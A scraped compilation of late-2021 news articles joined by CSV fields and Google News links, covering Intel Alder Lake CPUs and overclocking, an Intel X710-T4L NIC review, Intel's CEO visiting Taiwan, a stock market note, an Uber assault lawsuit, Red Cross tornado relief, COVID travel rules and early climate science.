If you're looking to save some coin the graphics-less $384 Core i7-12700KF comes with a $25 price reduction and has the exact same specs as the 12700K which is incredibly attractive if you plan on using a discrete graphics card. Notably you will lose Quick Sync capabilities and the iGPU fallback that you can use for troubleshooting in the event of an issue with a discrete GPU. However those same conditions exist with all of AMD's competing chips (there is no option for graphics on the 5800X and 5900X) so this is a comparable option. Speaking of which the standard Core i7-12700K comes with the UHD Graphics 770 with 32 EUs that run at a 300 / 1500 MHz base/boost.



The 12700K is bookended by the Core i9-12900K and the Core i5-12600K. The $589 16-core Core i9-12900K comes with eight P-cores that support hyper-threading and eight single-threaded E-cores for a total of 24 threads. The P-cores have a 3.2 GHz base and peak frequencies reach 5.2 GHz. The E-cores have a 2.4 GHz base and stretch up to 3.9 GHz. The chip is equipped with 30MB of L3 cache and 14MB of L2.



The $289 Core i5-12600K comes with six threaded P-cores that operate at 3.7 / 4.9 GHz and four E-cores that run at 2.8 / 3.6 GHz for a total of 16 threads. That's paired with 20MB of L3 and 9.5MB of L2 cache.

The Alder Lake SoC will span from desktop PCs to ultramobile devices with TDP ratings from 9W to 125W all built on the Intel 7 process. The desktop PC comes with up to eight Performance (P) cores and eight Efficient (E) cores for a total of 16 cores and 24 threads and up to 30 MB of L3 cache for a single chip.

Alder Lake supports either DDR4 or DDR5 (LP4x/LP5 too). Desktop PC supports x16 PCIe Gen 5 and x4 PCIe Gen 4 .

. Intel's new hyper-threaded Performance (P) core which comes with the Golden Cove microarchitecture designed for low-latency single-threaded performance comes with an average of 19% more IPC than the Cypress Cove architecture in Rocket Lake .

. Intel's new single-threaded Efficiency (E) core comes with the Gracemont microarchitecture to improve multi-threaded performance and provide exceptional area efficiency (small footprint) and performance-per-watt. Four small cores fit in roughly the same area as a Skylake core and deliver 80% more performance in threaded work (at the same power) . A single E core also delivers 40% more performance than a single-threaded Skylake core (at the same power) in single-threaded work (caveats apply to both).

. A single E core also delivers 40% more performance than a single-threaded Skylake core (at the same power) in single-threaded work (caveats apply to both). Intel's Thread Director is a hardware-based technology that assures threads are assigned to either the P or E cores in an optimized manner. This is the sleeper tech that enables the hybrid architecture.

Intel Z690 Motherboards for Intel Core i7-12700K

Intel's Alder Lake drops into Socket 1700 motherboards with the Z690 chipset. You can read about the chipset and some of the first 60+ motherboards in our Z690 motherboard roundup here.



The new LGA1700 socket is physically larger and has a lower Z-height than current sockets so most existing air and water coolers for LGA1200 and LGA115x motherboards won't work with 600-series motherboards. As a result upgraders will need to acquire a conversion kit or buy a new cooler.



Just like Z590 the Z690 chipset sports 16 lanes of PCIe 3.0 but Intel also added 12 lanes of PCIe 4.0. Intel also doubled the throughput of the DMI connection between the chip and chipset from an x8 DMI 3.0 pipe which clocks in at 7.88 GBps to an x8 DMI 4.0 connection that delivers 15.66 GBps. This much-needed bandwidth improvement allows for more throughput from attached RAID arrays. The increased DMI throughput is also beneficial for Z690's bolstered connectivity options like the new second USB 3.2 Gen 2x2 20 Gbps connection. You can read more about the Z690 chipset here.

DDR4 and DDR5 Support with Intel Core i7-12700K

Alder Lake chips support both DDR4 and DDR5 memory but there are several caveats tied to DDR5. As a default DDR5 runs in Gear 2 mode resulting in higher latency. Additionally standard motherboards only support DDR5-4800 if the motherboard has only two physical slots. Therefore at stock settings Alder Lake only supports DDR5-4400 on any motherboard with four slots — even if only two slots are populated. Support drops as low as DDR5-3600 if four slots are filled with dual-rank memory DIMMs. Here are the population rules for DDR5:

(Image credit: Intel)

In contrast Alder Lake supports DDR4-3200 in Gear 1 mode for all processors. That can yield latency and performance advantages for the tried-and-true memory.



A wide selection of DDR5 motherboards are available in all price bands but it appears that you'll only find DDR4 support on lower-end Z690 boards. Also unlike previous generations no motherboard supports both DDR4 and DDR5 which is probably due to DDR5's much tighter signal integrity requirements and onboard power control circuitry. Additionally unlike DDR4 DDR5 DIMMs come with PMIC (Power Management ICs) chips that control three on-DIMM voltage rails – VDD VDDQ and VPP.



DDR5 supports the new XMP 3.0 standard that supports up to five memory profiles (SPDs) to define unique frequency voltage and latency parameters and XMP 3.0 also lets you write and name two of the profiles.The new XMP profiles can also control the PMICs now present on DDR5 DIMMs. Naturally there are variances in PMIC designs and quality adding yet another variable to watch out for when selecting the Best RAM for overclocking.



Intel has also posted a new certification page on its website to help assure that each kit is compatible with certain motherboards and firmware revisions. You can read more about DDR5's new features here. We expect pricing for DDR5 to be substantially higher than DDR4 currently projected to be a 50 to 60% markup for some time.",https://news.google.com/articles/CBMiVmh0dHBzOi8vd3d3LnNlcnZldGhlaG9tZS5jb20vaW50ZWwteDcxMC10NGwtcXVhZC0xMGdiYXNlLXQtbmljLXJldmlldy1tYXNzaXZlLXVwZ3JhZGUv0gEA?hl=en-US&gl=US&ceid=US%3Aen,Intel X710-T4L Quad 10Gbase-T NIC Review Massive Upgrade,"Three quarters ago we looked at the Intel X710-T4 quad-port 10Gbase-T NIC and we noted something that we were unable to test in our review. Specifically there was a new version of the card out called the Intel X710-T4L that had a unique feature. That feature: support for 2.5Gbase-T and 5Gbase-T as well as 1/10Gbase-T. Today we are testing the X710-T4L to see how it performs. There is actually quite a bit more going on with the platform codenamed “Campbell Pond” than the specs would indicate versus the X710-T4.

Also we know that there are many OEMs out there that make NICs and many questions if the NICs we have are genuine Intel NICs. We worked with Intel to get the NIC to ensure we are showing a genuine part.

Intel X710-T4L Quad 10Gbase-T NIC

We are going to discuss this more later when we compare the Intel X710-T4L vs. the X710-T4 but something one will immediately see is that the heatsink is relatively small for a quad-port 10Gbase-T NIC. Many of the heatsinks we have seen over the years have been very large and this certainly is not.

Moving to the rear there is not much going on here. We will notice that this is a low-profile card. As a result one can see the ports are actually offset slightly from the main PCB to be able to both fit all four ports in a low-profile card and also to have an easy-to-reach screw. That screw is used to change to a low-profile bracket.

Here is a view of how the ports are offset to be a bit lower on the card. Something that is interesting is that although this card supports 2.5GbE and 5GbE speeds the faceplate does not mention those. We mention this because users who are looking at servers installed in racks while servicing may assume that the lack of 2.5GbE and 5GbE markings mean that this is the older X710-T4 version.

Overall this is a low-profile quad-port NIC but what makes the new version special are the new features.

Intel X710-T4L vs. X710-T4

Some may wonder what the difference is between these two cards. First here again is the X710-T4L heatsink:

Here is the X710-T4 heatsink:

As one can quickly tell the new version has a significantly smaller heatsink. A big reason for that is that Intel lowered the power ratings of these cards. As examples:

Typical power for quad-port 10Gbase-T:

Intel X710-T4L : 13.6W

: 13.6W Intel X710-T4: 24.7W

Maximum power for quad-port 10Gbase-T:

Intel X710-T4L : 14.2W

: 14.2W Intel X710-T4: 28.9W

Maximum quad-port 1Gbase-T:

Intel X710-T4L : 7.5W

: 7.5W Intel X710-T4: 18.1W

Roughly speaking the new “L” cards use about half the power of the previous generation. Four years make a big difference.

Here is the official table for the X710-T4L and X710-T2L to see the multi-gig power numbers as well:

In terms of controller differences there is more as well. The Intel X710-T4 has the Intel X710 controller while the X710-T4L uses the X710-TM4. That changes a number of options. Both are rated for CAT6 to 55m and CAT6a up to 100m at 10Gbase-T speeds. The X710-T4L is rated for up to 100m using 2.5Gbase-T 5Gbase-T even on CAT5e/ CAT6. So the new unit is compatible with 2.5GbE/5GbE longer runs on many existing wiring segments where the older card is not.

Intel X710-T4L Performance

We received about the performance we would expect from a solution like this. First we looked at quad 10Gbase-T performance:

Next we looked at multi-gig performance running at 1GbE 2.5GbE 5GbE and 10GbE speeds:

This is fairly basic testing but we were able to confirm that the new multi-gig functionality is working. That is what we would want to see from this NIC.

Final Words

While to a casual observer the Intel X710-T4L and the X710-T4 may seem like very similar parts they actually present a generational gap. When we discuss Intel CPUs we discuss generation-on-generation performance improvement. Here we get new multi-gig features and effectively half the power consumption.

One other difference that we did not mention is pricing. The new list price for the X710-T4L is around $100 less than the older X710-T4 (roughly $500 versus $600 but street pricing is different.) So lower pricing lower power and more features feel like this is an obvious choice. If you are buying a new quad-port 10Gbase-T NIC the Intel X710-T4L is our clear recommendation over the X710-T4 at this point.",https://news.google.com/articles/CBMiW2h0dHBzOi8vd3d3LnRlY2hyYWRhci5jb20vbmV3cy93ZS1vdmVyY2xvY2tlZC10aGUtaW50ZWwtY29yZS1pOS0xMjkwMGstaGVyZXMtaG93LWZhci13ZS1nb3TSAQA?hl=en-US&gl=US&ceid=US%3Aen,We overclocked the Intel Core i9-12900K here's how far we got,"The latest Intel processors for enthusiasts are here and based on early reviews both the Intel Core i9-12900K and Intel Core i5-12600K are impressive processors placing higher than competition.

If you’re looking to upgrade to these new Intel processors you will have to also update your motherboard and other aspects of your PC. This guide not only looks at the parts you would need to invest in but also how far we were able to push the Intel Core i9 12900K processor with some overclocking tips.

While the upcoming full review of these processors will go into a lot more detail on the updates Intel has made to the platform you should know the new 12th gen processors and the new Intel Z690 chipset is irst platform to offer support for PCI-express 5.0 and DDR5 memory.

Graphics cards and NVME drives powered by PCIe 5.0 will likely only be available during the second half of 2022 however DDR5 memory is already here adding to your list of components that potentially need upgrading.

Although Intel 12th gen processors can work with DDR4 memory and there are some DDR4-compatible motherboards a DDR5 solution is a wiser investment. You’re already going to be purchasing a new processor and motherboard - might as well bite the bullet and also buy DDR5 memory which will be a lot more helpful for future updates.

The build

Here are the three new components that we have used for this guide:

Intel Core i9 12900K processor

MSI MEG Z690 Unify motherboard

Corsair Dominator DDR5 5200Mhz (2 x 32GB CL38 Kit)

(Image credit: Future)

The only other component that you might need to upgrade would be your CPU cooler. Since the size of these new CPUs is different the mounting placement of your cooler is also slightly different. To avoid this some motherboard manufacturers like ASUS have drilled two sets of holes to allow older brackets to fit onto their new board. But if that’s not the case with the motherboard you get you should contact your cooler manufacturer to see if it can ship new backplates to you.

If you’re lucky your backplate on the cooler might be adjustable which was the case with the Corsair iCUE H150i Elite Capellix Liquid CPU Cooler we used. Here are the rest of the components we used

Zotac RTX 3070 Ti Graphics card (PCI 4.0)

Samsung 980 Pro SSD (PCI 4.0)

Corsair HX750i 750 watt PSU

Once the equipment was all set up we managed to get some help from Tarek Hamdy the recognized overclocking expert in the Middle East who holds some records for overclocking globally.

Before we get into overclocking just a quick note on the motherboard and RAM that we’ve used for this guide. The MSI MEG Z690 Unify motherboard that we are using was sent to us from MSI focused on the overclocking capabilities. It supports Gen 5 on the first PCI-E slot with up to 128GB/s transfer bandwidth and has five M.2 connectors four of which support PCIe 4.0 speeds. You also get four RAM slots supporting DDR5 memory up to 6666Mhz.

(Image credit: Future)

One of the nice things about the MSI MEG Z690 Unify motherboard is that the LED that posts diagnostic codes during bootup switches to a CPU temperature monitor after booting showing you the temperature of your CPU.

The RAM was sent to us from Corsair and is the Dominator Platinum RGB series. This was a 64GB kit with two 32GB DDR5 modules clocked at 5200MHz. DDR5 is a huge upgrade from DDR4 providing a massive increase in bandwidth and performance.

Overclocking

The new Intel 12th gen processors have two sets of cores - performance cores and efficiency cores. On the Core i9 12900K you have eight performance cores and eight efficiency cores. These performance cores by default have voltages set between 0.85v - 1.275v and speeds set between 3.2GHz to 5.1GHz. The exception to this are two specific cores that can go a little higher to 5.2GHz in our case. These cores are referred to as golden cores.

The first thing we did was update the BIOS on the Unify motherboard to the latest available version. Since this article is more about testing the CPU performance we primarily tested in Cinebench and AIDA 64 rather than any PC game benchmarks that are more focused on GPU performance.

We started with the stock speeds and voltages on the CPU and memory by loading the “default optimized settings” on the BIOS which set the following parameters. At stock speed we got a score of 25319 in Cinebench.

(Image credit: Future)

Before overclocking the processor we wanted to observe temperatures on it that our AIO cooler could handle. We did that by adjusting the CPU Voltage to 1.32v and ran CineBench. Expectedly the CPU started throttling when we hit 100C.

After playing around with voltages a little more we settled at 1.27v which was the sweet spot for the 12900K. This voltage level is also something an AIO cooler can handle.

Our next step was to raise the CPU multiplier to 52 effectively running the P cores at 5200MHz. However the CPU failed to boot and we went down a step to 5.1GHz which posted and managed to run complete ten minutes of Cinebench testing. We tried the same method on the E cores and after disabling Intel SpeedStep from the BIOS ended up with a multiplier of 40.

(Image credit: Future)

Using these settings CPU temperature hit 95c under load when running Cinebench which is just below the 100c mark where the CPU starts throttling. This resulted in our Cinebench R23 score of 27596 points which is about 10% higher than the 25319 points we got at default voltage and speeds.

Next we wanted to test overclocking DDR5 which is a bit trickier than DDR4. Our main focus was to achieve the highest speeds on AIDA64’s Read/Write/Copy/latency tests. We switched the CPU back to defaults speeds and voltage and selected the XMP profile for the RAM which was 5200Mhz @ 38-38-38-82-2T VDD/VDDQ running at 1.25v. We kept an eye on DDR5 temperatures during testing which hit a little over 40c - there was no cooling mounted or pointed towards the RAM modules.

(Image credit: Future)

Since we are dealing with Micron chips on the RAM  we weren’t expecting a huge jump in speeds and the max we got to was 5400Mhz with decent CL configurations. That’s just 200Mhz over the XMP profile.

To reach those speeds we upped the voltage to 1.435v on both VDD/VDDQ and started to train the RAM from 5200Mhz to 5600Mhz at very loose timings. The PC refused to boot at 5600Mhz but reducing it to 5400Mhz worked nicely. We then started to tighten the table clocks and after many different combinations crashes and restarts ended up with 36-39-29-74-2T. For some reason this MSI motherboard wouldn’t change the Tras Pre time- whatever we selected would just result in 39. Here are the results from AIDA64.

(Image credit: Future)

To summarize we were able to get a decent 10% increase in CPU performance with overclocking. We recommend using at the least a good AIO cooler if you’re planning on overclocking but a custom kit will definitely get you better results. If you are going the AIO route you should under-volt the CPU a bit to keep temperatures in check.

There wasn’t a big margin with overclocking DDR5; possibly because our modules were using Micron chips. If you’re lucky enough to get Hynix or Samsung you might get better results.

We also think that BIOS optimizations updates on Z690 motherboard will help and hopefully MSI fixes the Tras issue. Nevertheless you’re still getting a much higher performance on DDR5 compared to DDR4.",https://news.google.com/articles/CBMid2h0dHBzOi8vd3d3LnJldXRlcnMuY29tL3RlY2hub2xvZ3kvaW50ZWwtc2hvd3MtcmVzZWFyY2gtcGFja2luZy1tb3JlLWNvbXB1dGluZy1wb3dlci1pbnRvLWNoaXBzLWJleW9uZC0yMDI1LTIwMjEtMTItMTEv0gEA?hl=en-US&gl=US&ceid=US%3Aen,Intel shows research for packing more computing power into chips beyond 2025,ERROR: Article `download()` failed with 401 Client Error: HTTP Forbidden for url: https://www.reuters.com/technology/intel-shows-research-packing-more-computing-power-into-chips-beyond-2025-2021-12-11/ on URL https://news.google.com/articles/CBMid2h0dHBzOi8vd3d3LnJldXRlcnMuY29tL3RlY2hub2xvZ3kvaW50ZWwtc2hvd3MtcmVzZWFyY2gtcGFja2luZy1tb3JlLWNvbXB1dGluZy1wb3dlci1pbnRvLWNoaXBzLWJleW9uZC0yMDI1LTIwMjEtMTItMTEv0gEA?hl=en-US&gl=US&ceid=US%3Aen,https://news.google.com/articles/CBMiQ2h0dHBzOi8vd3d3LnRhaXBlaXRpbWVzLmNvbS9OZXdzL2Jpei9hcmNoaXZlcy8yMDIxLzEyLzExLzIwMDM3NjkzNjfSAQA?hl=en-US&gl=US&ceid=US%3Aen,Intel CEO to visit Taiwan for chip talks,"Intel CEO to visit Taiwan for chip talks

FOUNDRY BID: Pat Gelsinger has ruffled feathers with his calls to limit government chip funding to local firms and criticism of the concentration of chip production in Taiwan

Bloomberg





Intel Corp CEO Pat Gelsinger is to visit Taiwan and Malaysia next week for talks that show how manufacturing in Asia is crucial to his efforts to turn around the fortunes of the world’s largest chipmaker by revenue.

Gelsinger’s trip is to include a meeting with leaders of Taiwan Semiconductor Manufacturing Co (TSMC 台積電) people familiar with his plans said.

Intel needs TSMC’s advanced manufacturing services and plans to compete with the Taiwanese company in the foundry business a tricky balancing act for the CEO.

Intel Corp CEO Patrick Gelsinger speaks during an interview at an Economic Club of Washington event in Washington on Thursday. Photo: Bloomberg

This is Gelsinger’s first trip to Asia since taking the top job at Intel earlier this year and comes as he publicly lobbies the US government to allocate money for the country’s chip industry to domestic companies only.

He has said that overseas manufacturers — such as TSMC and Samsung Electronics Co which both have plans to build plants in the US — should not get money through the Chips Act which is going through political approvals in Washington.

As part of those efforts he has said that the concentration of advanced manufacturing in Taiwan is a strategic risk.

TSMC is both a threat to Intel and an interim solution to issues that have seen the US giant lose manufacturing leadership in the chip industry the foundation of its dominance for three decades.

Rivals such as Nvidia Corp and Advanced Micro Devices Inc use TSMC’s production to make chips they say are better than Intel’s offerings. Market share losses and weak earnings from Intel have helped bolster their case.

Part of Gelsinger’s answer to that is a strategy for combining parts of processors made by TSMC with other contributions from his own factories to produce more competitive computer components.

At the same time he is investing heavily to improve his own production to the point where he should no longer need TSMC’s cutting-edge production.

He plans to open factories that would make semiconductors for other companies which is the foundry business model that TSMC pioneered.

While that gives TSMC some leverage it is also left with some tricky decisions. The kind of production that Intel wants and the huge volume of orders it could provide are potentially lucrative for the Taiwanese company. Intel still has about an 80 percent share of the computer processor market.

Gelsinger has said that competition and cooperation between companies is nothing new and technology is full of such arrangements.

Intel has long used TSMC for manufacturing of less-important support chips for computers and other parts of its portfolio.

TSMC’s rapid rise has been built on navigating the complex web of rivalries among its customers of guaranteeing impartiality and of pushing forward production technology quickly. Its customers include Apple Inc Qualcomm Inc Sony Group Corp as well as Nvidia and AMD.

Gelsinger is also to visit Malaysia where COVID-19-related shutdowns of plants have hurt chip supply for many companies.

Intel relies on the Southeast Asian country for some of its chip packaging operations the critical last step in the semiconductor manufacturing process."

The stock market's recovery rally over the past week represents an opportunity for investors to sell ahead of an upcoming Fed interest rate ""shock"" Bank of America's Michael Hartnett said in a Friday note.

Hartnett recommends investors ""sell the rip"" rather than ""buy the dip"" in stocks as interest rate hikes are about to rock Wall Street and amid a strikingly similar unwind in tech stocks compared to the dot-com bubble in 2000.

According to Hartnett the Fed could and should begin to hike interest rates at its December meeting next week. If they don't the market will price in a 0.50% interest rate hike in March 2022 because of a ""red hot labor market"" Hartnett said pointing to Thursday's jobless claims data hitting its lowest level since 1969.

If Hartnett's Fed rate hike expectations pan out that would likely be a shock to Wall Street with most market participants expecting the Fed to start with a 0.25% rate hike in the second half of 2022.

Hartnett is referring to the mega-cap tech complex which consists of five stocks driving 64% of the Nasdaq's 23% year-to-date gain. Those five stocks are Microsoft Alphabet Apple Nvidia and Tesla.

""The bubble in speculative froth has popped"" Hartnett said highlighting that the ongoing breakdown in Ark Invest's Disruptive Innovation fund is closely tracking the descent of Invesco during the 2000 dot-com unwind. Ark's Cathie Wood defended her fund's investment strategy this week and estimates big gains ahead.

Finally investors shouldn't get too excited about short-term rallies in the stock market after big sell-offs as they tend to serve as head fakes to bullish investors during a declining market. According to Hartnett's analysis the Nasdaq staged 11 ""dead cat bounces"" with rallies as high as 45% between April 2000 and August 2002 well before the stock market bottomed in October 2002.

Since the Nasdaq fell about 5% in late November it has since rallied as much as 4.5% before continuing slightly lower representing a dead cat bounce if it doesn't hit record highs in the near future.",https://news.google.com/articles/CBMiXmh0dHBzOi8vd3d3LmlucXVpcmVyLmNvbS90cmFuc3BvcnRhdGlvbi91YmVyLXBoaWxhZGVscGhpYS1zZXh1YWwtYXNzYXVsdC1sYXdzdWl0LTIwMjExMjEzLmh0bWzSAQA?hl=en-US&gl=US&ceid=US%3Aen,Philly woman suing Uber saying she was sexually assaulted by driver,"The logo for Uber above a trading post on the floor of the New York Stock Exchange in May 2019. Read more

It’s the stuff of nightmares: After a night drinking with friends a young woman hails an Uber for what she thinks will be a safe ride home. The driver sexually assaults her.

A Philadelphia woman alleges that’s what happened to her in October 2017 according to a civil lawsuit she has filed against the ride-sharing company and the driver.

Uber has disclosed it received nearly 6000 reports of sexual assault in 2017 and 2018. Meanwhile the rapid development of Uber Lyft and other platform-based companies in the sharing economy continues to challenge long-standing legal approaches and regulatory schemes across the country.

“The gist of the case is Uber promises safety” said J. Conor Corcoran a Center City lawyer representing the woman. “The ride did get her from point A to point B but it wasn’t safe. He wouldn’t have had the opportunity to take advantage of her without Uber’s facilitation.”

Uber’s promise reinforced in advertising corporate communications and social media campaigns at the time amounted to a warranty on which the woman relied and the company failed to deliver the lawsuit argues. It also contends that Uber did not do adequate vetting of drivers as it was growing rapidly and people flocked to the platform to work.

An Uber spokesperson said the company won’t comment on pending litigation. Its attorneys have not yet filed an answer to the suit. Uber says it’s always working to improve safety for users of its app but declined to talk about it on the record.

The ride-sharing company formerly required people who alleged sexual assault or harassment to submit their cases to binding arbitration private court-like hearings to settle disputes and to adhere to a nondisclosure agreement. But Uber changed that policy in 2018 under pressure from former employees and the public and as it was preparing to make an initial public stock offering.

Now the company says survivors are free to pursue claims in open court if they choose. In December 2019 Uber issued the report detailing the 6000 sexual-assault reports it had handled saying that it was “statistically extremely rare” but that even one incident was “unacceptable.” Uber is scheduled to release another report on assaults by the end of the year.

Competitor ride-sharing company Lyft issued its own report in October disclosing 4158 reported sexual assaults from 2017 through 2019. It ended its mandatory arbitration requirement right after Uber did.

On Oct. 6 2017 the Philadelphia woman was with friends at Time restaurant and bar on Sansom Street and about 2 a.m. used the Uber app on her smartphone to hail a ride to her North Philadelphia apartment about two miles away the suit says.

The driver came into the restaurant to meet her and escort her to his car the suit says. He put her in the front seat and she remembered nothing of the ride it says. She said she had been drinking but not enough to black out and believes the driver had drugged her drink inside the restaurant.

The complaint says the woman awoke in her apartment the next morning with the driver standing over her.

She had a sexual-assault forensic exam done and was interviewed by Philadelphia detectives who also took a sheet and towel with semen samples on them Corcoran said. He added that she never heard back from police.

The Philadelphia Police Department did not respond to questions about the case including whether there is an active investigation.

The woman through her lawyer declined to comment.

Uber has been shielded from legal liability in many cases because it classifies drivers as independent contractors rather than employees said Adam F. Scales a professor at Rutgers Law School in Camden who specializes in torts and insurance law.

“They have maintained they’re just a platform that puts people together” Scales said. “Obviously reality has undermined that some.”

But even in cases where judges rule drivers have the status of employee Uber has a “very strong” argument that “sexual assault which is horrific is not within the scope of duties of a driver” and the company can’t anticipate and be responsible for an individual’s assault Scales said.

On the other hand he said Uber could be assessed damages if it is proved that it did not do enough investigation of drivers before they joined the app or for insufficient monitoring of them.

The suit was initially filed in state court in late September but was transferred to federal District Court on Oct. 5 at Uber’s request because the parties are from different states. The company is headquartered in California and it and its subsidiaries are incorporated in Delaware.

In late October Corcoran moved to have the federal judge send the case back to the Court of Common Pleas in Philadelphia because the driver who is also a defendant is a resident of the state where the alleged actions took place.

There is no deadline by which the judge must rule. The suit does not specify the monetary damages the woman is seeking.",,,,,,,,,

The American Red Cross and our partners are working around the clock across multiple states to help those in need and make sure everyone has a safe place to stay food to eat critical relief supplies emotional support and comfort in the face of one of the most devastating tornado outbreaks in years.



At least 24 tornadoes ripped across six states in the dark of night impacting people in Arkansas Illinois Indiana Kentucky Missouri and Tennessee. Initial reports show that some communities have suffered significant damage with homes and buildings destroyed and hundreds of thousands of people left without power.



Several emergency shelters are open to provide comfort for people who can’t return home. As the weather clears Red Cross volunteers will be out in affected communities assessing the damage left behind to help determine the types of support people may need in the coming days and weeks.



THREAT NOT OVER The National Weather Service reports the severe weather continues today from the Ohio and Tennessee valleys to the northern Gulf States. As Red Cross workers respond to last night’s tornadoes we urge everyone who remains in the path of this ongoing severe weather system to listen to the advice of local officials and be ready to get to a safe place quickly in case of a tornado warning. Download the free Red Cross Emergency app for access to real-time information and safety tips. The Emergency app is available in app stores by searching for the American Red Cross or going to redcross.org/apps.



PLEASE GIVE BLOOD The Red Cross has provided more than 160 blood products to hospitals in response to these devastating tornadoes. We remain in touch with our hospital partners throughout affected areas and stand ready to provide additional blood products as needed. We also anticipate Red Cross blood drives in affected communities may be canceled or experience lower donor turnout in the coming days further challenging an already historically low blood supply.



YOU CAN HELP people affected by disasters like storms home fires and countless other crises by making a gift to Red Cross Disaster Relief. Those in areas unaffected by this tornado outbreak are urged to make an appointment today to give blood and ensure blood products are available for patients wherever the need arises.



Your donation is a commitment to helping people in need and every single contribution matters enabling the Red Cross to prepare for respond to and help people recover from disasters big and small. To make a financial donation or schedule an appointment to give blood or platelets visit redcross.org or call 800-RED CROSS. You can also use the Red Cross Blood Donor app or text the word REDCROSS to 90999 to make a $10 gift today.



CONNECT WITH A LOVED ONE If you are unable to locate someone who has been impacted by the storms call during off-peak hours for the best chance of getting through. Send a text message which may go through when phone calls cannot. You can also check your loved one’s social media pages or send an email. Call friends and relatives who may have already been in contact with your loved one or call people and places where your loved one is well-known; neighbors employer school place of worship senior center social club/center union or fraternal organization.



If your missing loved one is elderly has a functional or access needs suffers from a medical or mental condition or has difficulty understanding the English language you can reach out to your local Red Cross for assistance. If you lived with your missing loved one in the same home prior to the disaster but became separated or they are a member of the military community please reach out to your local Red Cross chapter for assistance.



AFTER A TORNADO (More tornado safety information available here.) Return to your neighborhood only when officials say it is safe to do so.

Keep children and pets away from hazardous sites and floodwaters.

If you have children leave them with a relative or friend while you conduct the first inspection of your home after the disaster.

Check the outside of your home before you enter. Look for loose power lines broken or damaged gas lines foundation cracks missing support beams and other damage. Ask a building inspector or contractor to check the structure before you enter.

If power lines are down outside your home don't step in puddles or standing water. Report them immediately to the power company.

Don't cut or walk past colored tape that was placed over doors or windows to mark damaged areas unless you've been told that it is safe to do so. If a building inspector has placed a color-coded sign on the home don't enter until you get more information advice and instructions from your local authorities.

If you smell gas or hear a hissing noise leave the property immediately and get far away from it. Call the fire department after you reach safety.

IF YOUR POWER IS OUT (More power outage safety information can be found here.). There are ways that you can minimize loss and keep everyone as comfortable as possible.

Use flashlights in the dark — not candles.

Don’t drive unless necessary. Traffic lights will be out and roads could be congested.

Turn off and unplug any appliances equipment and electronics. When the power comes back on surges or spikes can damage equipment.

Leave one light on so you’ll know when power is restored.

If a power outage is two hours or less don’t be concerned about losing perishable foods. During a prolonged outage keep refrigerator and freezer doors closed as much as possible to protect your food.

Use perishable food from the refrigerator first. Then use food from the freezer.

Perishable food is safe to eat when it has a temperature of 40 degrees Fahrenheit or below.

If the power outage will continue beyond a day prepare a cooler with ice for your freezer items. Keep food in a dry cool spot and cover it at all times.

If you are using a generator keep it dry and don’t use it in wet conditions.

Never use a generator grill camp stove or other gasoline propane natural gas or charcoal-burning device inside a home garage basement or other partially enclosed area. Keep this equipment outside and away from doors windows and vents which could allow carbon monoxide to come indoors.

Operate the generator on a dry surface under an open canopy-like structure such as under a tarp held up by poles. Don’t touch a generator with wet hands.

Turn the generator off and let it cool down before refueling. Gasoline spilled on hot engine parts could catch fire.

Plug appliances directly into the generator. Never plug a generator into a wall outlet.

COVID-19 has not changed the Red Cross mission. We are providing the same types of support we always have and ensuring people have a safe place to stay during disasters is a critical part of that support. How we support sheltering efforts may be different in each community depending on local emergency plans and the scale of the disaster.

Responding to disasters is a team effort and no single organization can do it alone — particularly in this current environment. To help keep everyone safe we’re using safety precautions including masks health screenings enhanced cleaning procedures and encouraging social distancing regardless of vaccine status.



The Red Cross helps anyone in need after a disaster and everyone is welcome in our shelters. We encourage people who plan to stay in a Red Cross shelter to bring prescription medications extra clothing pillows blankets hygiene supplies other comfort items and important documents. Don’t forget to bring any special items for children such as diapers formula and toys or for family members who have unique needs.

Assuming you are traveling to a country open to nonessential travel the vaccine and testing documentation required for entry could range from nothing (Mexico) to detailed and numerous (Norway and many others). Before booking you can research online what you’ll need — on a running list from The New York Times here or the websites of various airlines the C.D.C. the U.S. State Department or that of your destination’s government — but be prepared to recheck requirements in the days leading up to your departure in case rules have changed.

Here are the types of documentation that many destinations now require from U.S. travelers. As in prepandemic times make physical copies of everything and if you have digital versions organize them in an accessible place on your phone. Keep them handy too as you will be asked for your documents multiple times during your journey.

Proof of vaccination

No matter your destination no matter what requirements it has for proving you are vaccinated against the coronavirus it’s smart to bring your physical C.D.C.-issued vaccine card with you along with digital photos of your card and paper photocopies. You might not need it — be sure to store it safely — but don’t assume that a U.S.-based digital passport or QR code is acceptable. For example your physical C.D.C. card will be accepted in France and the United Kingdom; the latter however also accepts certain state-issued digital health apps for entry like California’s Vaccine Record and New York’s Excelsior Pass. And remember to check what vaccines are accepted at your destination.",https://news.google.com/articles/CBMiRGh0dHBzOi8vd3d3LmxpdmVzY2llbmNlLmNvbS9odW1hbnMtZmlyc3Qtd2FybmVkLWFib3V0LWNsaW1hdGUtY2hhbmdl0gEA?hl=en-US&gl=US&ceid=US%3Aen,When did scientists first warn humanity about climate change?,"Climate change warnings are coming thick and fast from scientists; thousands have signed a paper stating that ignoring climate change would yield ""untold suffering"" for humanity and more than 99% of scientific papers agree that humans are the cause. But climate change wasn't always on everyone's radar. So when did humans first become aware of climate change and the dangers it poses?

Scientists first began to worry about climate change toward the end of the 1950s Spencer Weart a historian and retired director of the Center for History of Physics at the American Institute of Physics in College Park Maryland told Live Science in an email. ""It was just a possibility for the 21st century which seemed very far away but seen as a danger that should be prepared for.""

The scientific community began to unite for action on climate change in the 1980s and the warnings have only escalated since. However these recent warnings are just the tip of the melting iceberg; people's interest in how our activities affect the climate actually dates back thousands of years.

Related: Has the Earth ever been this hot before?

As far back as ancient Greece (1200 B.C. to A.D. 323) people debated whether draining swamps or cutting down forests might bring more or less rainfall to the region according to Weart's Discovery of Global Warming website which is hosted by the American Institute of Physics and shares the name with his book "" The Discovery of Global Warming "" (Harvard University Press 2008).

The ancient Greek debates were among the first documented climate change discussions but they focused only on local regions. It wasn't until a few millennia later in 1896 that Swedish scientist Svante Arrhenius (1859-1927) became the first person to imagine that humanity could change the climate on a global scale according to Weart. That's when Arrhenius published calculations in The London Edinburgh and Dublin Philosophical Magazine and Journal of Science showing that adding carbon dioxide to the atmosphere could warm the planet.

This work built on the research of other 19th-century scientists such as Joseph Fourier (1768-1830) who hypothesized that Earth would be far cooler without an atmosphere and John Tyndall (1820-1893) and Eunice Newton Foote (1819-1888) who separately demonstrated that carbon dioxide and water vapor trapped heat and suggested that an atmosphere could do the same JSTOR Daily reported .

